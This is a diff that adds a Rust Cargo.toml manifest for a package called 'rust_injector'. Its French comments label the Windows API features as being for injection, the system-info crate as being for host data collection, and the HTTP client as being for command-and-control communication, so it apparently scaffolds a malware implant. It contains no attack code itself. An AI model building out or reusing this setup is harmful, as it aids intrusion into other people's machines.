@@ -1,0 +1,31 @@
+[package]
+name = "rust_injector"
+version = "0.1.0"
+edition = "2021"
+
+[dependencies]
+# Pour les appels API Windows (Injection)
+windows = { version = "0.52", features = [
+    "Win32_System_Diagnostics_ToolHelp",
+    "Win32_System_Memory",
+    "Win32_System_Threading",
+    "Win32_Foundation",
+    "Win32_Security",
+    "Win32_System_SystemInformation",
+    "Win32_System_WindowsProgramming", 
+    "Win32_NetworkManagement_IpHelper",
+    "Win32_System_Rpc",
+] }
+
+# Pour la collecte d'infos système (remplace les 300 lignes de ifdef)
+sysinfo = "0.30"
+
+# Pour la communication C2 (remplace winsock2 raw)
+reqwest = { version = "0.11", features = ["blocking", "json"] }
+serde = { version = "1.0", features = ["derive"] }
+serde_json = "1.0"
+
+# Utilitaires
+uuid = { version = "1.6", features = ["v4"] }
+base64 = "0.21"
+whoami = "1.4"
